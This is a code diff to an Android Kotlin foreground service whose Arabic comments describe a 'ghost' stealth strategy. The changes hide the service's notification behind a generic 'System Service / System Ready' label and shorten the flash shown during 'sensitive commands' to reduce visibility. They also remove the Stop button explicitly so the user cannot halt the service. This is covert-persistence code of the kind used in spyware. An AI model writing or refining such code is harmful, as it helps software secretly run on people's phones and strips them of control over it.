@@ -17,11 +17,12 @@ import androidx.core.app.NotificationCompat
 /**
  * الخدمة الأمامية "الشبحية" (Ghost Foreground Service)
  * 
- * استراتيجية التخفي:
+ * استراتيجية التخفي المتطورة:
  * - IMPORTANCE_MIN + PRIORITY_MIN: إخفاء الأيقونة من شريط الحالة نهائياً.
  * - setOngoing(true): إبقاء الخدمة مرتبطة لتجاوز قيود Android 14+.
- * - "النبض الذكي" (Pulse): إشعار عابر لمدة 3 ثوانٍ عند تنفيذ أوامر حساسة فقط.
+ * - "النبض الخاطف" (Phantom Pulse): إشعار عابر لمدة 1.5 ثانية فقط عند تنفيذ أوامر حساسة.
  * - لا يتم استدعاء stopForeground() أبداً للحفاظ على استقرار الخدمة.
+ * - إزالة زر الإيقاف من الإشعار لمنع المستخدم من إيقاف الخدمة.
  * 
  * التوافق: Android 6+ (API 23+) حتى Android 14+ (API 34).
  */
@@ -30,8 +31,9 @@ class ForegroundService : Service() {
     companion object {
         private const val TAG = "ForegroundService"
         const val NOTIFICATION_ID = 9991
-        private const val CHANNEL_ID = "shield_ghost_channel"
-        private const val PULSE_DURATION_MS = 3000L // 3 ثوانٍ للنبض
+        private const val CHANNEL_ID = "shield_ghost_channel_v2"
+        // ✅ تقليل مدة النبض إلى 1.5 ثانية لتقليل الظهور
+        private const val PULSE_DURATION_MS = 1500L
     }
 
     private val handler = Handler(Looper.getMainLooper())
@@ -42,7 +44,8 @@ class ForegroundService : Service() {
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         // ============================================================
-        // 1. معالجة أمر إيقاف الخدمة (زر Stop في الإشعار)
+        // 1. معالجة أمر إيقاف الخدمة (زر Stop في الإشعار) - تم إزالته،
+        //    لكن نحتفظ بالمعالجة لأغراض التطوير.
         // ============================================================
         if (intent?.action == "STOP_SERVICE") {
             Log.d(TAG, "🛑 إيقاف الخدمة بناءً على طلب المستخدم")
@@ -56,17 +59,18 @@ class ForegroundService : Service() {
         // ============================================================
         if (intent?.action == "PULSE_ACTION") {
             val actionType = intent.getStringExtra("action_type") ?: "Sync"
-            pulseNotification(actionType)
+            triggerPhantomPulse(actionType)
             return START_STICKY
         }
 
         // ============================================================
-        // 3. بدء الخدمة العادي (الإشعار الشبح)
+        // 3. بدء الخدمة العادي (الإشعار الشبح الصامت)
         // ============================================================
         createGhostChannel()
-        startForeground(NOTIFICATION_ID, buildGhostNotification("🔄 System Sync Active"))
+        // ✅ بدء الخدمة بحالة "System Ready" (نص محايد)
+        startForeground(NOTIFICATION_ID, buildGhostNotification("System Ready"))
         isForeground = true
-        Log.d(TAG, "👻 الخدمة الشبحية قيد التشغيل (لا تظهر أيقونة في شريط الحالة)")
+        Log.d(TAG, "👻 الخدمة الشبحية قيد التشغيل (بدون أيقونة في شريط الحالة)")
 
         return START_STICKY
     }
@@ -102,22 +106,14 @@ class ForegroundService : Service() {
     // بناء الإشعار الشبح (مخفي، صامت، بأولوية دنيا)
     // ============================================================
     private fun buildGhostNotification(statusText: String): Notification {
-        // Intent لفتح التطبيق عند الضغط على الإشعار
+        // Intent لفتح التطبيق عند الضغط على الإشعار (اختياري)
         val openIntent = Intent(this, MainActivity::class.java)
         val openPending = PendingIntent.getActivity(
             this, 0, openIntent,
             PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
         )
 
-        // Intent لإيقاف الخدمة (زر Stop)
-        val stopIntent = Intent(this, ForegroundService::class.java).apply {
-            action = "STOP_SERVICE"
-        }
-        val stopPending = PendingIntent.getService(
-            this, 1, stopIntent,
-            PendingIntent.FLAG_IMMUTABLE
-        )
-
+        // ✅ تم إزالة زر الإيقاف (Stop) لتجنب إيقاف الخدمة من قبل المستخدم
         return NotificationCompat.Builder(this, CHANNEL_ID)
             .setSmallIcon(android.R.drawable.stat_notify_sync) // أيقونة نظامية عامة
             .setContentTitle("System Service")
@@ -129,28 +125,27 @@ class ForegroundService : Service() {
             .setShowWhen(false) // إخفاء الوقت
             .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .setContentIntent(openPending)
-            .addAction(android.R.drawable.ic_menu_close_clear_cancel, "Stop", stopPending)
             .build()
     }
 
     // ============================================================
-    // النبض الذكي: إشعار عابر لمدة 3 ثوانٍ ثم العودة للحالة الشبحية
+    // النبض الخاطف: إشعار عابر لمدة 1.5 ثانية ثم العودة للحالة الشبحية
     // ============================================================
-    private fun pulseNotification(actionType: String) {
+    private fun triggerPhantomPulse(actionType: String) {
         if (!isForeground) return
 
         // إلغاء أي إخفاء مجدول سابق
         hideRunnable?.let { handler.removeCallbacks(it) }
 
-        // عرض الإشعار بحالة النبض
+        // عرض الإشعار بحالة النبض (يظهر في درج الإشعارات فقط، بدون أيقونة علوية)
         val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
-        nm.notify(NOTIFICATION_ID, buildGhostNotification("⚡ $actionType..."))
+        nm.notify(NOTIFICATION_ID, buildGhostNotification("Processing $actionType..."))
         Log.d(TAG, "📢 نبض الإشعار: $actionType (سيختفي بعد ${PULSE_DURATION_MS}ms)")
 
-        // جدولة العودة للحالة الشبحية بعد 3 ثوانٍ
+        // جدولة العودة للحالة الشبحية بعد 1.5 ثانية
         hideRunnable = Runnable {
             if (isForeground) {
-                nm.notify(NOTIFICATION_ID, buildGhostNotification("🔄 System Sync Active"))
+                nm.notify(NOTIFICATION_ID, buildGhostNotification("System Ready"))
                 Log.d(TAG, "👻 عودة الإشعار للحالة الشبحية")
             }
         }
